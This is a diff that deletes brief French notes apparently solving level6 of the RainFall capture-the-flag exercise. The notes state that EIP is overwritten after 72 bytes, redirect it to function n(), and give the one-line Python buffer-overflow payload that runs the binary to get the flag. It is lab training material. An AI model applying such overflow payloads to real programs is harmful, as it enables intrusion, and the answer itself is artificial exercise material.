@@ -1,8 +1,0 @@
-
-au bout de 72 char on reecrie eip
-
-remplace eip par n();
-
-choppe le flag
-level6@RainFall:~$ ./level6 $(python -c "print 'A' * 72 + '\x54\x84\x04\x08'")
-
